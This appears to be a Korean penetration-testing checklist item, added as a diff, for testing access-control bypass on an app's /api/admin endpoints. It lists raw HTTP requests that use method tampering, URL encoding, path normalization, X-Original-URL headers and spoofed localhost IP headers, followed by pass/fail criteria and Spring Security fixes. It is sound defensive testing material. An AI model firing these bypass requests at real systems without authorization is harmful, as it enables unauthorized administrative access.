@@ -1,0 +1,122 @@
+================================================================================
+[VCE-EX-17] 접근 제어 우회 가능성 확인
+도메인: exchange
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: URL/HTTP 메서드 조작을 통한 접근 제어 우회
+   - 번호: EX-17
+   - 위험도: High
+   - OWASP: A01:2021 – Broken Access Control
+
+2. 대상 기능 & 엔드포인트
+   - 로컬:  http://localhost:8080/api/admin/**
+   - 운영:  https://vceapp.com/api/admin/**
+   - HTTP 메서드: 전체 메서드 테스트
+   - 인증 요건: ADMIN 역할 필요 (우회 시도 대상)
+
+3. 취약점 원리 (Why this works)
+   Spring Security의 접근 제어 설정이 특정 HTTP 메서드나 URL 패턴에 따라
+   적용 여부가 달라질 수 있다.
+
+   우회 기법:
+   1. HTTP 메서드 변조: GET → POST, DELETE → GET
+   2. URL 인코딩: /api/admin → /api/%61dmin
+   3. 대소문자 변환: /api/Admin, /API/ADMIN
+   4. 경로 정규화: /api/./admin, /api//admin
+   5. 커스텀 헤더: X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization
+   6. HTTP 오버라이드: X-HTTP-Method-Override: DELETE
+
+4. 테스트 절차 (Step-by-step)
+
+   [사전 준비]
+   - test@vce.com (USER 역할) JWT 획득
+   - 일반 사용자로 /api/admin 접근 시 403 확인
+
+   Step 1. HTTP 메서드 변조
+   --- HTTP 요청 예시 ---
+   GET /api/admin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   X-HTTP-Method-Override: GET
+   ---
+
+   POST로 GET 역할 우회:
+   --- HTTP 요청 예시 ---
+   POST /api/admin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   Content-Length: 0
+   ---
+
+   Step 2. URL 인코딩 우회
+   --- HTTP 요청 예시 ---
+   GET /api/%61dmin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+
+   GET /api/admin%2fmembers HTTP/1.1
+
+   GET /api/admin%252fmembers HTTP/1.1
+
+   GET /%61pi/admin/members HTTP/1.1
+   ---
+
+   Step 3. 대소문자 우회
+   --- HTTP 요청 예시 ---
+   GET /api/Admin/members HTTP/1.1
+   GET /api/ADMIN/members HTTP/1.1
+   GET /API/admin/members HTTP/1.1
+   ---
+
+   Step 4. 경로 정규화 우회
+   --- HTTP 요청 예시 ---
+   GET /api/./admin/members HTTP/1.1
+   GET /api//admin/members HTTP/1.1
+   GET /api/orders/../admin/members HTTP/1.1
+   GET /api/admin/./members HTTP/1.1
+   ---
+
+   Step 5. 커스텀 헤더 우회
+   --- HTTP 요청 예시 ---
+   GET /api/orders HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   X-Original-URL: /api/admin/members
+   ---
+
+   --- HTTP 요청 예시 ---
+   GET /api/orders HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   X-Rewrite-URL: /api/admin/members
+   ---
+
+   Step 6. 커스텀 IP 헤더로 로컬호스트 위장
+   --- HTTP 요청 예시 ---
+   GET /api/admin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <USER_JWT>
+   X-Forwarded-For: 127.0.0.1
+   X-Real-IP: 127.0.0.1
+   X-Custom-IP-Authorization: 127.0.0.1
+   ---
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      - URL 인코딩/대소문자 변환된 경로로 /api/admin 접근 → HTTP 200
+      - X-Original-URL 헤더로 접근 제어 우회 성공
+      - POST 메서드로 GET 전용 엔드포인트 접근 성공
+   ✗ 안전 (Not Vulnerable):
+      - 모든 우회 시도에 HTTP 403 Forbidden 반환
+      - Spring Security가 정규화 후 비교하여 우회 불가
+
+6. 예상 취약 포인트 (코드 위치)
+   - SecurityConfig.java — requestMatchers 패턴 설정 방식
+   - Spring MVC 버전에 따른 경로 정규화 차이
+
+7. 권고 조치
+   - Spring Security 최신 버전 사용 (경로 정규화 강화됨)
+   - requestMatchers에 AntPathMatcher 대신 PathPatternParser 사용
+   - X-Original-URL, X-Rewrite-URL 헤더를 Nginx/로드밸런서에서 제거
+   - 메서드별 접근 제어 명시적 지정: .requestMatchers(HttpMethod.GET, "/api/admin/**")
